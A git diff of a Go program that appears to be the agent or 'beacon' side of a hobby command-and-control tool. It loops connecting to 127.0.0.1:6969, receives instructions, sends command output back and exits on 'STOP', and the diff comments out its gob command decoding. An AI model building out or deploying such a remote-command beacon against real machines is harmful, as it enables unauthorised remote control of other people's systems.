@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/gob"
 	"fmt"
 	"log"
 	"net"
@@ -11,12 +10,21 @@ import (
 )
 
 func main() {
+	// beacon, err := net.Dial("tcp", "127.0.0.1:6969")
+	// if err != nil {
+	// 	log.Fatalln(err) // maybe try diff IP
+	// }
+	// dec := gob.NewDecoder(beacon)
+	// instruct := &types.GiveAgentCommand{}
+	// dec.Decode(instruct)
+	// fmt.Printf("Received : %+v", instruct)
+
 	for {
 		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
 		if err != nil {
 			log.Fatalln(err) // maybe try diff IP
 		}
-		err = beacon.SetReadDeadline(time.Now().Add(time.Second * 5))
+		err = beacon.SetReadDeadline(time.Now().Add(time.Minute * 5))
 		if err != nil {
 			log.Fatalln(err)
 		}
@@ -47,10 +55,10 @@ func main() {
 			beacon.Write(buf)
 			continue
 		}
-		dec := gob.NewDecoder(beacon)
-		instruct := &agent.giveAgentCommand{}
-		dec.Decode(instruct)
-		fmt.Printf("Received : %+v", instruct)
+		// dec := gob.NewDecoder(beacon)
+		// instruct := &types.GiveAgentCommand{}
+		// dec.Decode(instruct)
+		// fmt.Printf("Received : %+v", instruct)
 
 		if strings.TrimSpace(string(CmdOut)) == "STOP" {
 			fmt.Println("TCP client exiting...")
